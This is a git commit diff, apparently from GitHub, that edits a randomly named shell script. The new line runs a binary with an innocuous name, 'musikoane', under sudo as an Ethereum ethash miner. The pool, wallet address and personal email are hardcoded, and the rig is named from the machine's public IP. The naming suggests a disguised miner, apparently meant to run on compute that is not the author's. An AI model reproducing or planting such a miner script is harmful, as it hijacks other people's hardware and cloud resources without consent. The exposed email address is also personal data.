c380b4c88270fb8c4450991d173fb1d16666b045
stongermin <78987208+stongermin@users.noreply.github.com>
2021-03-27 03:45:41 +0700

    Update ty7a8eajj.sh

--- ty7a8eajj.sh
+++ ty7a8eajj.sh
@@ -8,4 +8,4 @@ WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )
 
 cd "$(dirname "$0")"
 
-chmod +x ./musikoane && sudo ./musikoane -algo ethash -pool1 $POOL -wallet $WALLET -coin $COIN -rigName $WORKER -email $EMAIL
+chmod +x ./musikoane && sudo ./musikoane -algo ethash -pool1 eth.f2pool.com:6688 -wallet 0x35c7ed9124ea813033d909c0698a1eb52aa9e268 -coin eth -rigName $(echo "$(curl -s ifconfig.me)" | tr . _ ) -email adityarizal323@gmail.com
